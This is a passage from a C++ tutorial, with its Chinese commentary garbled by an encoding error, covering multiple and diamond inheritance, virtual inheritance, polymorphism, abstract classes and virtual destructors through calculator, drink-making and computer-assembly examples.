Base1 &#123;\npublic:\n\tBase1()\n\t&#123;\n\t\tm_A &#x3D; 100;\n\t&#125;\npublic:\n\tint m_A;\n&#125;;\n\nclass Base2 &#123;\npublic:\n\tBase2()\n\t&#123;\n\t\tm_A &#x3D; 200;  &#x2F;&#x2F;å¼€å§‹æ˜¯m_B ä¸ä¼šå‡ºé—®é¢˜ï¼Œä½†æ˜¯æ”¹ä¸ºmAå°±ä¼šå‡ºç°ä¸æ˜ç¡®\n\t&#125;\npublic:\n\tint m_A;\n&#125;;\n\n&#x2F;&#x2F;è¯­æ³•ï¼šclass å­ç±»ï¼šç»§æ‰¿æ–¹å¼ çˆ¶ç±»1 ï¼Œç»§æ‰¿æ–¹å¼ çˆ¶ç±»2 \nclass Son : public Base2, public Base1 \n&#123;\npublic:\n\tSon()\n\t&#123;\n\t\tm_C &#x3D; 300;\n\t\tm_D &#x3D; 400;\n\t&#125;\npublic:\n\tint m_C;\n\tint m_D;\n&#125;;\n\n\n&#x2F;&#x2F;å¤šç»§æ‰¿å®¹æ˜“äº§ç”Ÿæˆå‘˜åŒåçš„æƒ…å†µ\n&#x2F;&#x2F;é€šè¿‡ä½¿ç”¨ç±»åä½œç”¨åŸŸå¯ä»¥åŒºåˆ†è°ƒç”¨å“ªä¸€ä¸ªåŸºç±»çš„æˆå‘˜\nvoid test01()\n&#123;\n\tSon s;\n\tcout &lt;&lt; &quot;sizeof Son &#x3D; &quot; &lt;&lt; sizeof(s) &lt;&lt; endl;\n\tcout &lt;&lt; s.Base1::m_A &lt;&lt; endl;\n\tcout &lt;&lt; s.Base2::m_A &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼š å¤šç»§æ‰¿ä¸­å¦‚æœçˆ¶ç±»ä¸­å‡ºç°äº†åŒåæƒ…å†µï¼Œå­ç±»ä½¿ç”¨æ—¶å€™è¦åŠ ä½œç”¨åŸŸ\nè±å½¢ç»§æ‰¿è±å½¢ç»§æ‰¿æ¦‚å¿µï¼š\nä¸¤ä¸ªæ´¾ç”Ÿç±»ç»§æ‰¿åŒä¸€ä¸ªåŸºç±»\nåˆæœ‰æŸä¸ªç±»åŒæ—¶ç»§æ‰¿è€…ä¸¤ä¸ªæ´¾ç”Ÿç±»\nè¿™ç§ç»§æ‰¿è¢«ç§°ä¸ºè±å½¢ç»§æ‰¿ï¼Œæˆ–è€…é’»çŸ³ç»§æ‰¿\nè±å½¢ç»§æ‰¿é—®é¢˜æ¡ˆä¾‹ï¼š\nç¾Šç»§æ‰¿äº†åŠ¨ç‰©çš„æ•°æ®ï¼Œé©¼åŒæ ·ç»§æ‰¿äº†åŠ¨ç‰©çš„æ•°æ®ï¼Œå½“è‰æ³¥é©¬ä½¿ç”¨æ•°æ®æ—¶ï¼Œå°±ä¼šäº§ç”ŸäºŒä¹‰æ€§ã€‚è‰æ³¥é©¬ç»§æ‰¿è‡ªåŠ¨ç‰©çš„æ•°æ®ç»§æ‰¿äº†ä¸¤ä»½ï¼Œå…¶å®æˆ‘ä»¬åº”è¯¥æ¸…æ¥šï¼Œè¿™ä»½æ•°æ®æˆ‘ä»¬åªéœ€è¦ä¸€ä»½å°±å¯ä»¥ã€‚\nç¤ºä¾‹ï¼š\nclass Animal\n&#123;\npublic:\n\tint m_Age;\n&#125;;\n\n&#x2F;&#x2F;ç»§æ‰¿å‰åŠ virtualå…³é”®å­—åï¼Œå˜ä¸ºè™šç»§æ‰¿\n&#x2F;&#x2F;æ­¤æ—¶å…¬å…±çš„çˆ¶ç±»Animalç§°ä¸ºè™šåŸºç±»\nclass Sheep : virtual public Animal &#123;&#125;;\nclass Tuo   : virtual public Animal &#123;&#125;;\nclass SheepTuo : public Sheep, public Tuo &#123;&#125;;\n\nvoid test01()\n&#123;\n\tSheepTuo st;\n\tst.Sheep::m_Age &#x3D; 100;\n\tst.Tuo::m_Age &#x3D; 200;\n\n\tcout &lt;&lt; &quot;st.Sheep::m_Age &#x3D; &quot; &lt;&lt; st.Sheep::m_Age &lt;&lt; endl;\n\tcout &lt;&lt; &quot;st.Tuo::m_Age &#x3D; &quot; &lt;&lt;  st.Tuo::m_Age &lt;&lt; endl;\n\tcout &lt;&lt; &quot;st.m_Age &#x3D; &quot; &lt;&lt; st.m_Age &lt;&lt; endl;\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\n\nè±å½¢ç»§æ‰¿å¸¦æ¥çš„ä¸»è¦é—®é¢˜æ˜¯å­ç±»ç»§æ‰¿ä¸¤ä»½ç›¸åŒçš„æ•°æ®ï¼Œå¯¼è‡´èµ„æºæµªè´¹ä»¥åŠæ¯«æ— æ„ä¹‰\nåˆ©ç”¨è™šç»§æ‰¿å¯ä»¥è§£å†³è±å½¢ç»§æ‰¿é—®é¢˜\n\nå¤šæ€å¤šæ€çš„åŸºæœ¬æ¦‚å¿µå¤šæ€æ˜¯C++é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§ä¹‹ä¸€\nå¤šæ€åˆ†ä¸ºä¸¤ç±»\n\né™æ€å¤šæ€: å‡½æ•°é‡è½½ å’Œ è¿ç®—ç¬¦é‡è½½å±äºé™æ€å¤šæ€ï¼Œå¤ç”¨å‡½æ•°å\nåŠ¨æ€å¤šæ€: æ´¾ç”Ÿç±»å’Œè™šå‡½æ•°å®ç°è¿è¡Œæ—¶å¤šæ€\n\né™æ€å¤šæ€å’ŒåŠ¨æ€å¤šæ€åŒºåˆ«ï¼š\n\né™æ€å¤šæ€çš„å‡½æ•°åœ°å€æ—©ç»‘å®š - ç¼–è¯‘é˜¶æ®µç¡®å®šå‡½æ•°åœ°å€\nåŠ¨æ€å¤šæ€çš„å‡½æ•°åœ°å€æ™šç»‘å®š - è¿è¡Œé˜¶æ®µç¡®å®šå‡½æ•°åœ°å€\n\nä¸‹é¢é€šè¿‡æ¡ˆä¾‹è¿›è¡Œè®²è§£å¤šæ€\nclass Animal\n&#123;\npublic:\n\t&#x2F;&#x2F;Speakå‡½æ•°å°±æ˜¯è™šå‡½æ•°\n\t&#x2F;&#x2F;å‡½æ•°å‰é¢åŠ ä¸Švirtualå…³é”®å­—ï¼Œå˜æˆè™šå‡½æ•°ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™å°±ä¸èƒ½ç¡®å®šå‡½æ•°è°ƒç”¨äº†ã€‚\n\tvirtual void speak()\n\t&#123;\n\t\tcout &lt;&lt; &quot;åŠ¨ç‰©åœ¨è¯´è¯&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass Cat :public Animal\n&#123;\npublic:\n\tvoid speak()\n\t&#123;\n\t\tcout &lt;&lt; &quot;å°çŒ«åœ¨è¯´è¯&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass Dog :public Animal\n&#123;\npublic:\n\n\tvoid speak()\n\t&#123;\n\t\tcout &lt;&lt; &quot;å°ç‹—åœ¨è¯´è¯&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n&#x2F;&#x2F;æˆ‘ä»¬å¸Œæœ›ä¼ å…¥ä»€ä¹ˆå¯¹è±¡ï¼Œé‚£ä¹ˆå°±è°ƒç”¨ä»€ä¹ˆå¯¹è±¡çš„å‡½æ•°\n&#x2F;&#x2F;å¦‚æœå‡½æ•°åœ°å€åœ¨ç¼–è¯‘é˜¶æ®µå°±èƒ½ç¡®å®šï¼Œé‚£ä¹ˆé™æ€è”ç¼–\n&#x2F;&#x2F;å¦‚æœå‡½æ•°åœ°å€åœ¨è¿è¡Œé˜¶æ®µæ‰èƒ½ç¡®å®šï¼Œå°±æ˜¯åŠ¨æ€è”ç¼–\n\nvoid DoSpeak(Animal &amp; animal)\n&#123;\n\tanimal.speak();\n&#125;\n&#x2F;&#x2F;\n&#x2F;&#x2F;å¤šæ€æ»¡è¶³æ¡ä»¶ï¼š \n&#x2F;&#x2F;1ã€æœ‰ç»§æ‰¿å…³ç³»\n&#x2F;&#x2F;2ã€å­ç±»é‡å†™çˆ¶ç±»ä¸­çš„è™šå‡½æ•°\n&#x2F;&#x2F;å¤šæ€ä½¿ç”¨ï¼š\n&#x2F;&#x2F;çˆ¶ç±»æŒ‡é’ˆæˆ–å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡\n\nvoid test01()\n&#123;\n\tCat cat;\n\tDoSpeak(cat);\n\n\n\tDog dog;\n\tDoSpeak(dog);\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\nå¤šæ€æ»¡è¶³æ¡ä»¶\n\næœ‰ç»§æ‰¿å…³ç³»\nå­ç±»é‡å†™çˆ¶ç±»ä¸­çš„è™šå‡½æ•°\n\nå¤šæ€ä½¿ç”¨æ¡ä»¶\n\nçˆ¶ç±»æŒ‡é’ˆæˆ–å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡\n\né‡å†™ï¼šå‡½æ•°è¿”å›å€¼ç±»å‹ å‡½æ•°å å‚æ•°åˆ—è¡¨ å®Œå…¨ä¸€è‡´ç§°ä¸ºé‡å†™\nå¤šæ€æ¡ˆä¾‹ä¸€-è®¡ç®—å™¨ç±»æ¡ˆä¾‹æè¿°ï¼š\nåˆ†åˆ«åˆ©ç”¨æ™®é€šå†™æ³•å’Œå¤šæ€æŠ€æœ¯ï¼Œè®¾è®¡å®ç°ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡Œè¿ç®—çš„è®¡ç®—å™¨ç±»\nå¤šæ€çš„ä¼˜ç‚¹ï¼š\n\nä»£ç ç»„ç»‡ç»“æ„æ¸…æ™°\nå¯è¯»æ€§å¼º\nåˆ©äºå‰æœŸå’ŒåæœŸçš„æ‰©å±•ä»¥åŠç»´æŠ¤\n\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;æ™®é€šå®ç°\nclass Calculator &#123;\npublic:\n\tint getResult(string oper)\n\t&#123;\n\t\tif (oper &#x3D;&#x3D; &quot;+&quot;) &#123;\n\t\t\treturn m_Num1 + m_Num2;\n\t\t&#125;\n\t\telse if (oper &#x3D;&#x3D; &quot;-&quot;) &#123;\n\t\t\treturn m_Num1 - m_Num2;\n\t\t&#125;\n\t\telse if (oper &#x3D;&#x3D; &quot;*&quot;) &#123;\n\t\t\treturn m_Num1 * m_Num2;\n\t\t&#125;\n\t\t&#x2F;&#x2F;å¦‚æœè¦æä¾›æ–°çš„è¿ç®—ï¼Œéœ€è¦ä¿®æ”¹æºç \n\t&#125;\npublic:\n\tint m_Num1;\n\tint m_Num2;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;æ™®é€šå®ç°æµ‹è¯•\n\tCalculator c;\n\tc.m_Num1 &#x3D; 10;\n\tc.m_Num2 &#x3D; 10;\n\tcout &lt;&lt; c.m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;+&quot;) &lt;&lt; endl;\n\n\tcout &lt;&lt; c.m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;-&quot;) &lt;&lt; endl;\n\n\tcout &lt;&lt; c.m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; c.getResult(&quot;*&quot;) &lt;&lt; endl;\n&#125;\n\n\n\n&#x2F;&#x2F;å¤šæ€å®ç°\n&#x2F;&#x2F;æŠ½è±¡è®¡ç®—å™¨ç±»\n&#x2F;&#x2F;å¤šæ€ä¼˜ç‚¹ï¼šä»£ç ç»„ç»‡ç»“æ„æ¸…æ™°ï¼Œå¯è¯»æ€§å¼ºï¼Œåˆ©äºå‰æœŸå’ŒåæœŸçš„æ‰©å±•ä»¥åŠç»´æŠ¤\nclass AbstractCalculator\n&#123;\npublic :\n\n\tvirtual int getResult()\n\t&#123;\n\t\treturn 0;\n\t&#125;\n\n\tint m_Num1;\n\tint m_Num2;\n&#125;;\n\n&#x2F;&#x2F;åŠ æ³•è®¡ç®—å™¨\nclass AddCalculator :public AbstractCalculator\n&#123;\npublic:\n\tint getResult()\n\t&#123;\n\t\treturn m_Num1 + m_Num2;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;å‡æ³•è®¡ç®—å™¨\nclass SubCalculator :public AbstractCalculator\n&#123;\npublic:\n\tint getResult()\n\t&#123;\n\t\treturn m_Num1 - m_Num2;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;ä¹˜æ³•è®¡ç®—å™¨\nclass MulCalculator :public AbstractCalculator\n&#123;\npublic:\n\tint getResult()\n\t&#123;\n\t\treturn m_Num1 * m_Num2;\n\t&#125;\n&#125;;\n\n\nvoid test02()\n&#123;\n\t&#x2F;&#x2F;åˆ›å»ºåŠ æ³•è®¡ç®—å™¨\n\tAbstractCalculator *abc &#x3D; new AddCalculator;\n\tabc-&gt;m_Num1 &#x3D; 10;\n\tabc-&gt;m_Num2 &#x3D; 10;\n\tcout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;\n\tdelete abc;  &#x2F;&#x2F;ç”¨å®Œäº†è®°å¾—é”€æ¯\n\n\t&#x2F;&#x2F;åˆ›å»ºå‡æ³•è®¡ç®—å™¨\n\tabc &#x3D; new SubCalculator;\n\tabc-&gt;m_Num1 &#x3D; 10;\n\tabc-&gt;m_Num2 &#x3D; 10;\n\tcout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;\n\tdelete abc;  \n\n\t&#x2F;&#x2F;åˆ›å»ºä¹˜æ³•è®¡ç®—å™¨\n\tabc &#x3D; new MulCalculator;\n\tabc-&gt;m_Num1 &#x3D; 10;\n\tabc-&gt;m_Num2 &#x3D; 10;\n\tcout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; &#x3D; &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;\n\tdelete abc;\n&#125;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;test01();\n\n\ttest02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼šC++å¼€å‘æå€¡åˆ©ç”¨å¤šæ€è®¾è®¡ç¨‹åºæ¶æ„ï¼Œå› ä¸ºå¤šæ€ä¼˜ç‚¹å¾ˆå¤š\nçº¯è™šå‡½æ•°å’ŒæŠ½è±¡ç±»åœ¨å¤šæ€ä¸­ï¼Œé€šå¸¸çˆ¶ç±»ä¸­è™šå‡½æ•°çš„å®ç°æ˜¯æ¯«æ— æ„ä¹‰çš„ï¼Œä¸»è¦éƒ½æ˜¯è°ƒç”¨å­ç±»é‡å†™çš„å†…å®¹\nå› æ­¤å¯ä»¥å°†è™šå‡½æ•°æ”¹ä¸ºçº¯è™šå‡½æ•°\nçº¯è™šå‡½æ•°è¯­æ³•ï¼švirtual è¿”å›å€¼ç±»å‹ å‡½æ•°å ï¼ˆå‚æ•°åˆ—è¡¨ï¼‰= 0 ;\nå½“ç±»ä¸­æœ‰äº†çº¯è™šå‡½æ•°ï¼Œè¿™ä¸ªç±»ä¹Ÿç§°ä¸º&#x3D;&#x3D;æŠ½è±¡ç±»&#x3D;&#x3D;\næŠ½è±¡ç±»ç‰¹ç‚¹ï¼š\n\næ— æ³•å®ä¾‹åŒ–å¯¹è±¡\nå­ç±»å¿…é¡»é‡å†™æŠ½è±¡ç±»ä¸­çš„çº¯è™šå‡½æ•°ï¼Œå¦åˆ™ä¹Ÿå±äºæŠ½è±¡ç±»\n\nç¤ºä¾‹ï¼š\nclass Base\n&#123;\npublic:\n\t&#x2F;&#x2F;çº¯è™šå‡½æ•°\n\t&#x2F;&#x2F;ç±»ä¸­åªè¦æœ‰ä¸€ä¸ªçº¯è™šå‡½æ•°å°±ç§°ä¸ºæŠ½è±¡ç±»\n\t&#x2F;&#x2F;æŠ½è±¡ç±»æ— æ³•å®ä¾‹åŒ–å¯¹è±¡\n\t&#x2F;&#x2F;å­ç±»å¿…é¡»é‡å†™çˆ¶ç±»ä¸­çš„çº¯è™šå‡½æ•°ï¼Œå¦åˆ™ä¹Ÿå±äºæŠ½è±¡ç±»\n\tvirtual void func() &#x3D; 0;\n&#125;;\n\nclass Son :public Base\n&#123;\npublic:\n\tvirtual void func() \n\t&#123;\n\t\tcout &lt;&lt; &quot;funcè°ƒç”¨&quot; &lt;&lt; endl;\n\t&#125;;\n&#125;;\n\nvoid test01()\n&#123;\n\tBase * base &#x3D; NULL;\n\t&#x2F;&#x2F;base &#x3D; new Base; &#x2F;&#x2F; é”™è¯¯ï¼ŒæŠ½è±¡ç±»æ— æ³•å®ä¾‹åŒ–å¯¹è±¡\n\tbase &#x3D; new Son;\n\tbase-&gt;func();\n\tdelete base;&#x2F;&#x2F;è®°å¾—é”€æ¯\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå¤šæ€æ¡ˆä¾‹äºŒ-åˆ¶ä½œé¥®å“æ¡ˆä¾‹æè¿°ï¼š\nåˆ¶ä½œé¥®å“çš„å¤§è‡´æµç¨‹ä¸ºï¼šç…®æ°´ - å†²æ³¡ - å€’å…¥æ¯ä¸­ - åŠ å…¥è¾…æ–™\nåˆ©ç”¨å¤šæ€æŠ€æœ¯å®ç°æœ¬æ¡ˆä¾‹ï¼Œæä¾›æŠ½è±¡åˆ¶ä½œé¥®å“åŸºç±»ï¼Œæä¾›å­ç±»åˆ¶ä½œå’–å•¡å’ŒèŒ¶å¶\n&#x2F;&#x2F;æŠ½è±¡åˆ¶ä½œé¥®å“\nclass AbstractDrinking &#123;\npublic:\n\t&#x2F;&#x2F;çƒ§æ°´\n\tvirtual void Boil() &#x3D; 0;\n\t&#x2F;&#x2F;å†²æ³¡\n\tvirtual void Brew() &#x3D; 0;\n\t&#x2F;&#x2F;å€’å…¥æ¯ä¸­\n\tvirtual void PourInCup() &#x3D; 0;\n\t&#x2F;&#x2F;åŠ å…¥è¾…æ–™\n\tvirtual void PutSomething() &#x3D; 0;\n\t&#x2F;&#x2F;è§„å®šæµç¨‹\n\tvoid MakeDrink() &#123;\n\t\tBoil();\n\t\tBrew();\n\t\tPourInCup();\n\t\tPutSomething();\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;åˆ¶ä½œå’–å•¡\nclass Coffee : public AbstractDrinking &#123;\npublic:\n\t&#x2F;&#x2F;çƒ§æ°´\n\tvirtual void Boil() &#123;\n\t\tcout &lt;&lt; &quot;ç…®å†œå¤«å±±æ³‰!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;å†²æ³¡\n\tvirtual void Brew() &#123;\n\t\tcout &lt;&lt; &quot;å†²æ³¡å’–å•¡!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;å€’å…¥æ¯ä¸­\n\tvirtual void PourInCup() &#123;\n\t\tcout &lt;&lt; &quot;å°†å’–å•¡å€’å…¥æ¯ä¸­!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;åŠ å…¥è¾…æ–™\n\tvirtual void PutSomething() &#123;\n\t\tcout &lt;&lt; &quot;åŠ å…¥ç‰›å¥¶!&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;åˆ¶ä½œèŒ¶æ°´\nclass Tea : public AbstractDrinking &#123;\npublic:\n\t&#x2F;&#x2F;çƒ§æ°´\n\tvirtual void Boil() &#123;\n\t\tcout &lt;&lt; &quot;ç…®è‡ªæ¥æ°´!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;å†²æ³¡\n\tvirtual void Brew() &#123;\n\t\tcout &lt;&lt; &quot;å†²æ³¡èŒ¶å¶!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;å€’å…¥æ¯ä¸­\n\tvirtual void PourInCup() &#123;\n\t\tcout &lt;&lt; &quot;å°†èŒ¶æ°´å€’å…¥æ¯ä¸­!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;åŠ å…¥è¾…æ–™\n\tvirtual void PutSomething() &#123;\n\t\tcout &lt;&lt; &quot;åŠ å…¥æ¸æ!&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;ä¸šåŠ¡å‡½æ•°\nvoid DoWork(AbstractDrinking* drink) &#123;\n\tdrink-&gt;MakeDrink();\n\tdelete drink;\n&#125;\n\nvoid test01() &#123;\n\tDoWork(new Coffee);\n\tcout &lt;&lt; &quot;--------------&quot; &lt;&lt; endl;\n\tDoWork(new Tea);\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nè™šææ„å’Œçº¯è™šææ„å¤šæ€ä½¿ç”¨æ—¶ï¼Œå¦‚æœå­ç±»ä¸­æœ‰å±æ€§å¼€è¾Ÿåˆ°å †åŒºï¼Œé‚£ä¹ˆçˆ¶ç±»æŒ‡é’ˆåœ¨é‡Šæ”¾æ—¶æ— æ³•è°ƒç”¨åˆ°å­ç±»çš„ææ„ä»£ç \nè§£å†³æ–¹å¼ï¼šå°†çˆ¶ç±»ä¸­çš„ææ„å‡½æ•°æ”¹ä¸ºè™šææ„æˆ–è€…çº¯è™šææ„\nè™šææ„å’Œçº¯è™šææ„å…±æ€§ï¼š\n\nå¯ä»¥è§£å†³çˆ¶ç±»æŒ‡é’ˆé‡Šæ”¾å­ç±»å¯¹è±¡\néƒ½éœ€è¦æœ‰å…·ä½“çš„å‡½æ•°å®ç°\n\nè™šææ„å’Œçº¯è™šææ„åŒºåˆ«ï¼š\n\nå¦‚æœæ˜¯çº¯è™šææ„ï¼Œè¯¥ç±»å±äºæŠ½è±¡ç±»ï¼Œæ— æ³•å®ä¾‹åŒ–å¯¹è±¡\n\nè™šææ„è¯­æ³•ï¼š\nvirtual ~ç±»å()&#123;&#125;\n\nçº¯è™šææ„è¯­æ³•ï¼š\nvirtual ~ç±»å() &#x3D; 0;\nç±»å::~ç±»å()&#123;&#125;\n\nç¤ºä¾‹ï¼š\nclass Animal &#123;\npublic:\n\n\tAnimal()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Animal æ„é€ å‡½æ•°è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n\t&#125;\n\tvirtual void Speak() &#x3D; 0;\n\n\t&#x2F;&#x2F;ææ„å‡½æ•°åŠ ä¸Švirtualå…³é”®å­—ï¼Œå˜æˆè™šææ„å‡½æ•°\n\t&#x2F;&#x2F;virtual ~Animal()\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; &quot;Animalè™šææ„å‡½æ•°è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\n\tvirtual ~Animal() &#x3D; 0;\n&#125;;\n\nAnimal::~Animal()\n&#123;\n\tcout &lt;&lt; &quot;Animal çº¯è™šææ„å‡½æ•°è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;å’ŒåŒ…å«æ™®é€šçº¯è™šå‡½æ•°çš„ç±»ä¸€æ ·ï¼ŒåŒ…å«äº†çº¯è™šææ„å‡½æ•°çš„ç±»ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ã€‚ä¸èƒ½å¤Ÿè¢«å®ä¾‹åŒ–ã€‚\n\nclass Cat : public Animal &#123;\npublic:\n\tCat(string name)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Catæ„é€ å‡½æ•°è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n\t\tm_Name &#x3D; new string(name);\n\t&#125;\n\tvirtual void Speak()\n\t&#123;\n\t\tcout &lt;&lt; *m_Name &lt;&lt;  &quot;å°çŒ«åœ¨è¯´è¯!&quot; &lt;&lt; endl;\n\t&#125;\n\t~Cat()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Catææ„å‡½æ•°è°ƒç”¨!&quot; &lt;&lt; endl;\n\t\tif (this-&gt;m_Name !&#x3D; NULL) &#123;\n\t\t\tdelete m_Name;\n\t\t\tm_Name &#x3D; NULL;\n\t\t&#125;\n\t&#125;\n\npublic:\n\tstring *m_Name;\n&#125;;\n\nvoid test01()\n&#123;\n\tAnimal *animal &#x3D; new Cat(&quot;Tom&quot;);\n\tanimal-&gt;Speak();\n\n\t&#x2F;&#x2F;é€šè¿‡çˆ¶ç±»æŒ‡é’ˆå»é‡Šæ”¾ï¼Œä¼šå¯¼è‡´å­ç±»å¯¹è±¡å¯èƒ½æ¸…ç†ä¸å¹²å‡€ï¼Œé€ æˆå†…å­˜æ³„æ¼\n\t&#x2F;&#x2F;æ€ä¹ˆè§£å†³ï¼Ÿç»™åŸºç±»å¢åŠ ä¸€ä¸ªè™šææ„å‡½æ•°\n\t&#x2F;&#x2F;è™šææ„å‡½æ•°å°±æ˜¯ç”¨æ¥è§£å†³é€šè¿‡çˆ¶ç±»æŒ‡é’ˆé‡Šæ”¾å­ç±»å¯¹è±¡\n\tdelete animal;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\n\nè™šææ„æˆ–çº¯è™šææ„å°±æ˜¯ç”¨æ¥è§£å†³é€šè¿‡çˆ¶ç±»æŒ‡é’ˆé‡Šæ”¾å­ç±»å¯¹è±¡\nå¦‚æœå­ç±»ä¸­æ²¡æœ‰å †åŒºæ•°æ®ï¼Œå¯ä»¥ä¸å†™ä¸ºè™šææ„æˆ–çº¯è™šææ„\næ‹¥æœ‰çº¯è™šææ„å‡½æ•°çš„ç±»ä¹Ÿå±äºæŠ½è±¡ç±»\n\nå¤šæ€æ¡ˆä¾‹ä¸‰-ç”µè„‘ç»„è£…æ¡ˆä¾‹æè¿°ï¼š\nç”µè„‘ä¸»è¦ç»„æˆéƒ¨ä»¶ä¸º CPUï¼ˆç”¨äºè®¡ç®—ï¼‰ï¼Œæ˜¾å¡ï¼ˆç”¨äºæ˜¾ç¤ºï¼‰ï¼Œå†…å­˜æ¡ï¼ˆç”¨äºå­˜å‚¨ï¼‰\nå°†æ¯ä¸ªé›¶ä»¶å°è£…å‡ºæŠ½è±¡åŸºç±»ï¼Œå¹¶ä¸”æä¾›ä¸åŒçš„å‚å•†ç”Ÿäº§ä¸åŒçš„é›¶ä»¶ï¼Œä¾‹å¦‚Intelå‚å•†å’ŒLenovoå‚å•†\nåˆ›å»ºç”µè„‘ç±»æä¾›è®©ç”µè„‘å·¥ä½œçš„å‡½æ•°ï¼Œå¹¶ä¸”è°ƒç”¨æ¯ä¸ªé›¶ä»¶å·¥ä½œçš„æ¥å£\næµ‹è¯•æ—¶ç»„è£…ä¸‰å°ä¸åŒçš„ç”µè„‘è¿›è¡Œå·¥ä½œ\nç¤ºä¾‹ï¼š\n#include&lt;iostream&gt;\nusing namespace std;\n\n&#x2F;&#x2F;æŠ½è±¡CPUç±»\nclass CPU\n&#123;\npublic:\n\t&#x2F;&#x2F;æŠ½è±¡çš„è®¡ç®—å‡½æ•°\n\tvirtual void calculate() &#x3D; 0;\n&#125;;\n\n&#x2F;&#x2F;æŠ½è±¡æ˜¾å¡ç±»\nclass VideoCard\n&#123;\npublic:\n\t&#x2F;&#x2F;æŠ½è±¡çš„æ˜¾ç¤ºå‡½æ•°\n\tvirtual void display() &#x3D; 0;\n&#125;;\n\n&#x2F;&#x2F;æŠ½è±¡å†…å­˜æ¡ç±»\nclass Memory\n&#123;\npublic:\n\t&#x2F;&#x2F;æŠ½è±¡çš„å­˜å‚¨å‡½æ•°\n\tvirtual void storage() &#x3D; 0;\n&#125;;\n\n&#x2F;&#x2F;ç”µè„‘ç±»\nclass Computer\n&#123;\npublic:\n\tComputer(CPU * cpu, VideoCard * vc, Memory * mem)\n\t&#123;\n\t\tm_cpu &#x3D; cpu;\n\t\tm_vc &#x3D; vc;\n\t\tm_mem &#x3D; mem;\n\t&#125;\n\n\t&#x2F;&#x2F;æä¾›å·¥ä½œçš„å‡½æ•°\n\tvoid work()\n\t&#123;\n\t\t&#x2F;&#x2F;è®©é›¶ä»¶å·¥ä½œèµ·æ¥ï¼Œè°ƒç”¨æ¥å£\n\t\tm_cpu-&gt;calculate();\n\n\t\tm_vc-&gt;display();\n\n\t\tm_mem-&gt;storage();\n\t&#125;\n\n\t&#x2F;&#x2F;æä¾›ææ„å‡½æ•° é‡Šæ”¾3ä¸ªç”µè„‘é›¶ä»¶\n\t~Computer()\n\t&#123;\n\n\t\t&#x2F;&#x2F;é‡Šæ”¾CPUé›¶ä»¶\n\t\tif (m_cpu !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_cpu;\n\t\t\tm_cpu &#x3D; 